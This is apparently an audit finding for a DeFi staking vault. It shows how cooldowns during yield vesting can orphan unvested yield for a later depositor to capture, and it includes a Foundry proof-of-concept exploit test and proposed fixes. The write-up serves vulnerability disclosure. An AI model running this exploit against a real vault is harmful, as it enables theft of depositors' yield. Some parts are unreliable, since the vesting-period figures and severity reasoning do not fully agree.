## Title
Orphaned Unvested Yield Capture via Timing Cooldowns During Vesting Period

## Summary
The `cooldownShares` function allows users to burn shares and lock assets while yield is still unvested. Since `getUnvestedAmount()` is purely time-based and doesn't account for `totalSupply`, coordinated cooldowns during vesting can orphan unvested yield. Subsequent depositors can capture this orphaned yield as it vests, effectively stealing yield meant for previous shareholders.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTryCooldown.sol` (lines 109-118) and `src/token/wiTRY/StakediTry.sol` (lines 192-211, 262-278) [1](#0-0) 

**Intended Logic:** When users cooldown shares, they should receive their proportional share of all yield, including unvested amounts. The vesting mechanism should protect yield distribution across the vesting period for existing shareholders.

**Actual Logic:** The `cooldownShares` function calculates assets using `previewRedeem(shares)`, which bases calculations on `totalAssets()`. The `totalAssets()` function excludes unvested yield via `getUnvestedAmount()`. [2](#0-1) 

The critical flaw: `getUnvestedAmount()` is purely time-based and continues counting down even when `totalSupply = 0`: [3](#0-2) 

**Exploitation Path:**

1. **Setup**: Vault has shareholders (Alice: 1000 shares, Bob: 1000 shares, 2000 iTRY backing, 1:1 ratio)

2. **Yield Distribution**: YieldForwarder transfers 2000 iTRY yield to staking vault at block N
   - Contract balance: 4000 iTRY
   - `vestingAmount`: 2000 iTRY
   - `unvested`: 2000 iTRY (starts vesting over 30 days)
   - `totalAssets`: 4000 - 2000 = 2000 iTRY (yield not yet reflected in share price)

3. **Coordinated Cooldowns** (block N+1, immediately after yield distribution):
   - Alice calls `cooldownShares(1000)`:
     - `assets = previewRedeem(1000) = 1000 * 2000 / 2000 = 1000 iTRY`
     - Burns 1000 shares, sends 1000 iTRY to silo
     - `unvested` remains 2000 iTRY (time-based, very little time elapsed)
   - Bob calls `cooldownShares(1000)`:
     - `assets = 1000 iTRY` (based on remaining totalAssets)
     - Burns 1000 shares, sends 1000 iTRY to silo
     - Contract balance: 2000 iTRY
     - `totalSupply`: 0
     - `unvested`: still ~2000 iTRY
     - `totalAssets`: 2000 - 2000 = 0 iTRY

4. **Yield Theft** (block N+2):
   - Charlie (attacker) deposits 100 iTRY
   - Since `totalSupply = 0`, this is "first deposit"
   - `totalAssets = 0` (all 2000 iTRY is unvested)
   - Charlie receives 100 shares (1:1 ratio for empty vault)
   
5. **Vesting Completes** (30 days later):
   - `unvested`: 0 iTRY
   - Contract balance: 2100 iTRY
   - `totalAssets`: 2100 iTRY
   - Charlie's 100 shares now worth: 2100 iTRY
   - **Charlie redeems for 2000% profit (2100 iTRY for 100 iTRY deposit)**

**Security Property Broken:** Yield distribution integrity - yield should vest proportionally to shareholders who held shares during distribution. The orphaned yield was earned on capital provided by Alice and Bob but captured by Charlie.

## Impact Explanation
- **Affected Assets**: iTRY tokens in the StakediTry vault, specifically unvested yield
- **Damage Severity**: Attacker can capture 100% of orphaned unvested yield. In the example scenario, a 100 iTRY deposit captures 2000 iTRY of yield (2000% gain). The magnitude scales with the amount of unvested yield at time of attack.
- **User Impact**: All shareholders who cooldown during vesting periods forfeit their proportional share of unvested yield to whoever deposits next. This affects any users timing unstakes around yield distributions.

## Likelihood Explanation
- **Attacker Profile**: Any user can exploit this. Sophisticated attackers can coordinate with existing shareholders (e.g., use multiple addresses to cooldown then deposit with a fresh address), or simply front-run deposits into temporarily-empty vaults.
- **Preconditions**: 
  - Yield has been distributed via `transferInRewards` and is actively vesting
  - Existing shareholders cooldown enough shares to reduce `totalSupply` to 0 or near-0
  - Attacker is first to deposit after cooldowns complete
- **Execution Complexity**: Moderate - requires monitoring for yield distributions and cooldown events, then timing a deposit. Can be fully automated with mempool monitoring.
- **Frequency**: Exploitable every vesting cycle (default 1 hour per `MIN_VESTING_PERIOD`, max 30 days). Higher profitability with longer vesting periods and larger yield amounts.

## Recommendation

**Primary Fix**: Prevent deposits when unvested yield exists and `totalSupply` is below a safety threshold:

```solidity
// In src/token/wiTRY/StakediTry.sol, function _deposit, add check after line 249:

function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
        revert OperationNotAllowed();
    }
    
    // NEW: Prevent orphaned yield capture
    uint256 currentTotalSupply = totalSupply();
    uint256 unvested = getUnvestedAmount();
    if (unvested > 0 && currentTotalSupply < MIN_SHARES) {
        revert StillVesting(); // Cannot deposit into near-empty vault during vesting
    }
    
    super._deposit(caller, receiver, assets, shares);
    _checkMinShares();
}
```

**Alternative Fix**: Forfeit unvested yield when totalSupply reaches 0 by resetting vesting state:

```solidity
// In src/token/wiTRY/StakediTry.sol, add to _withdraw after line 276:

function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    if (
        hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
            || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
    ) {
        revert OperationNotAllowed();
    }

    super._withdraw(caller, receiver, _owner, assets, shares);
    _checkMinShares();
    
    // NEW: Reset vesting if vault becomes empty
    if (totalSupply() == 0 && getUnvestedAmount() > 0) {
        vestingAmount = 0;
        lastDistributionTimestamp = block.timestamp;
        // Unvested yield is forfeited to prevent orphaning
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_OrphanedYieldCapture.t.sol
// Run with: forge test --match-test test_OrphanedYieldCapture -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import "../src/token/wiTRY/StakediTryCooldown.sol";
import "../src/token/iTRY/iTry.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit_OrphanedYieldCapture is Test {
    StakediTryV2 public vault;
    iTry public itry;
    
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address admin = makeAddr("admin");
    address rewarder = makeAddr("rewarder");
    
    function setUp() public {
        // Deploy contracts
        itry = new iTry(admin);
        vault = new StakediTryV2(IERC20(address(itry)), rewarder, admin);
        
        // Setup: mint iTRY to users
        vm.startPrank(admin);
        itry.grantRole(keccak256("MINTER_CONTRACT"), admin);
        itry.mint(alice, 1000e18);
        itry.mint(bob, 1000e18);
        itry.mint(charlie, 100e18);
        itry.mint(rewarder, 2000e18);
        vm.stopPrank();
    }
    
    function test_OrphanedYieldCapture() public {
        // SETUP: Alice and Bob stake (1000 each)
        vm.startPrank(alice);
        itry.approve(address(vault), 1000e18);
        vault.deposit(1000e18, alice);
        vm.stopPrank();
        
        vm.startPrank(bob);
        itry.approve(address(vault), 1000e18);
        vault.deposit(1000e18, bob);
        vm.stopPrank();
        
        assertEq(vault.totalAssets(), 2000e18, "Initial totalAssets should be 2000");
        assertEq(vault.totalSupply(), 2000e18, "Initial totalSupply should be 2000");
        
        // EXPLOIT STEP 1: Large yield distribution (2000 iTRY)
        vm.startPrank(rewarder);
        itry.approve(address(vault), 2000e18);
        vault.transferInRewards(2000e18);
        vm.stopPrank();
        
        // Immediately after distribution, yield is unvested
        uint256 unvested = vault.getUnvestedAmount();
        assertEq(unvested, 2000e18, "All yield should be unvested");
        assertEq(vault.totalAssets(), 2000e18, "totalAssets excludes unvested");
        
        // EXPLOIT STEP 2: Alice and Bob cooldown (exiting while yield unvested)
        vm.startPrank(alice);
        vault.cooldownShares(1000e18);
        vm.stopPrank();
        
        vm.startPrank(bob);
        vault.cooldownShares(1000e18);
        vm.stopPrank();
        
        // After cooldowns: vault is empty but has unvested yield
        assertEq(vault.totalSupply(), 0, "totalSupply should be 0");
        assertEq(vault.getUnvestedAmount(), 2000e18, "Unvested remains");
        assertEq(vault.totalAssets(), 0, "totalAssets is 0");
        assertEq(itry.balanceOf(address(vault)), 2000e18, "Vault holds unvested yield");
        
        // EXPLOIT STEP 3: Charlie deposits into empty vault
        vm.startPrank(charlie);
        itry.approve(address(vault), 100e18);
        uint256 charlieShares = vault.deposit(100e18, charlie);
        vm.stopPrank();
        
        assertEq(charlieShares, 100e18, "Charlie gets 1:1 shares (empty vault)");
        
        // EXPLOIT STEP 4: Wait for yield to vest
        vm.warp(block.timestamp + 2 hours); // After MIN_VESTING_PERIOD
        
        // Unvested is now 0, totalAssets includes the yield
        assertEq(vault.getUnvestedAmount(), 0, "Yield fully vested");
        uint256 finalAssets = vault.totalAssets();
        assertEq(finalAssets, 2100e18, "totalAssets now includes vested yield");
        
        // VERIFY: Charlie redeems for massive profit
        vm.startPrank(charlie);
        uint256 charlieAssets = vault.redeem(charlieShares, charlie, charlie);
        vm.stopPrank();
        
        assertEq(charlieAssets, 2100e18, "Charlie redeems 2100 iTRY");
        assertEq(itry.balanceOf(charlie), 2100e18, "Charlie has 2100 iTRY");
        
        // Charlie turned 100 iTRY into 2100 iTRY (2000% profit)
        console.log("Charlie deposited:", 100e18);
        console.log("Charlie redeemed:", charlieAssets);
        console.log("Charlie profit:", charlieAssets - 100e18);
        console.log("Profit percentage:", ((charlieAssets - 100e18) * 100) / 100e18);
    }
}
```

**Notes:**
- The vulnerability exploits the time-based vesting calculation that doesn't consider `totalSupply = 0` as a special case
- The `_deposit` function has no protection against depositing when unvested yield exists with zero/low totalSupply [4](#0-3) 
- The `_withdraw` (called by `cooldownShares`) allows burning all shares without forfeiting unvested yield [5](#0-4) 
- This is distinct from the known MIN_SHARES griefing issue - this vulnerability enables profitable theft, not just griefing
- The attack is particularly profitable with longer vesting periods (up to 30 days allowed) and larger yield amounts

### Citations

**File:** src/token/wiTRY/StakediTryCooldown.sol (L109-118)
```text
    function cooldownShares(uint256 shares) external ensureCooldownOn returns (uint256 assets) {
        if (shares > maxRedeem(msg.sender)) revert ExcessiveRedeemAmount();

        assets = previewRedeem(shares);

        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);

        _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L192-194)
```text
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L199-211)
```text
    function getUnvestedAmount() public view returns (uint256) {
        uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

        if (timeSinceLastDistribution >= vestingPeriod) {
            return 0;
        }

        uint256 deltaT;
        unchecked {
            deltaT = (vestingPeriod - timeSinceLastDistribution);
        }
        return (deltaT * vestingAmount) / vestingPeriod;
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L240-252)
```text
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
        super._deposit(caller, receiver, assets, shares);
        _checkMinShares();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L262-278)
```text
    function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
        }

        super._withdraw(caller, receiver, _owner, assets, shares);
        _checkMinShares();
    }
```
